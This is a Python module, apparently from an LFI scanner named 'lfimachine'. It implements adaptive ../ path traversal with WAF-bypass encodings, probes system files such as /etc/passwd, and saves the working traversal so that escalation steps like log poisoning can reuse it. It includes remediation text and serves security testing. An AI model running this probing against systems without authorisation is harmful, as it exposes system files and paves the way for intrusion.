"""
Path-traversal detection.

This is the primary discovery technique. It probes OS-appropriate marker files
across a range of traversal depths, separator styles and WAF-bypass encodings,
scoring each response with the differential detector. The first depth/encoder
combination that confirms a known file is remembered on the context so that
escalation techniques (wrappers, log poisoning) can reuse the exact working
traversal instead of rediscovering it.
"""
from __future__ import annotations

from typing import Iterator, List, Optional  # noqa: F401

from lfimachine.core import detector
from lfimachine.core.result import Finding, Severity
from lfimachine.payloads import encoders as enc
from lfimachine.payloads import traversal_gen, wordlists
from lfimachine.techniques.base import Technique, TechniqueContext

REMEDIATION = (
    "Never pass user input to filesystem/inclusion APIs. Map identifiers to an "
    "allowlist of known files, call basename()/realpath() and verify the result "
    "stays within an intended base directory, and disable allow_url_include."
)


class TraversalTechnique(Technique):
    name = "path-traversal"
    description = "Adaptive ../ traversal with encoding negotiation"
    priority = 100

    def _probe_files(self, ctx: TechniqueContext) -> List[dict]:
        os_name = ctx.os_confirmed or ctx.fingerprint.os or "linux"
        probes = list(wordlists.PROBES.get(os_name, []))
        # Always keep a linux probe as a fallback even on suspected windows,
        # because containers/WSL frequently expose /etc/passwd regardless.
        if os_name != "linux":
            probes += wordlists.PROBES["linux"][:1]
        return probes

    def run(self, ctx: TechniqueContext) -> Iterator[Finding]:
        log = ctx.logger
        encoder_order = ctx.encoders or enc.default_encoder_order(ctx.aggressive)

        for probe in self._probe_files(ctx):
            finding = self._probe(ctx, probe, encoder_order)
            if finding is None:
                continue
            yield finding
            if ctx.stop_on_first:
                # Inclusion is proven; no need to also confirm other marker
                # files. Escalation techniques reuse the working traversal.
                return

    def _probe(self, ctx, probe, encoder_order) -> Optional[Finding]:
        log = ctx.logger
        target_file = probe["path"]
        expected = probe["sig"]
        log.verbose(f"[{self.name}] probing {target_file} on {ctx.point.describe()}")

        for raw_payload in traversal_gen.generate(
            target_file, min_depth=ctx.min_depth, max_depth=ctx.max_depth
        ):
            is_path = not raw_payload.startswith(("php://", "data://", "file://"))
            for encoder_name, encoded in enc.variants(
                raw_payload, encoder_order, is_path=is_path
            ):
                resp = ctx.point.send(ctx.client, encoded)
                det = detector.analyse(
                    resp, ctx.baseline, encoded, expected_signature=expected
                )
                if not det.confirmed:
                    continue

                # Lock in the working parameters for downstream techniques.
                ctx.confirmed_traversal = raw_payload
                ctx.confirmed_encoder = encoder_name
                ctx.os_confirmed = det.os_guess or ctx.os_confirmed

                log.good(
                    f"LFI confirmed via {self.name}: {ctx.point.describe()} -> "
                    f"{target_file} (encoder={encoder_name}, conf={det.confidence})"
                )
                return Finding(
                    technique=self.name,
                    title=f"Local File Inclusion — {target_file} disclosed",
                    severity=Severity.HIGH,
                    confidence=det.confidence,
                    url=resp.url or ctx.point.url,
                    parameter=ctx.point.parameter or "<path>",
                    method=ctx.point.method,
                    payload=encoded,
                    encoder=encoder_name,
                    evidence=det.evidence,
                    matched_signatures=det.matched,
                    os_guess=det.os_guess,
                    status_code=resp.status_code,
                    response_length=resp.length,
                    remediation=REMEDIATION,
                    extra={"detection_reason": det.reason},
                )
        return None
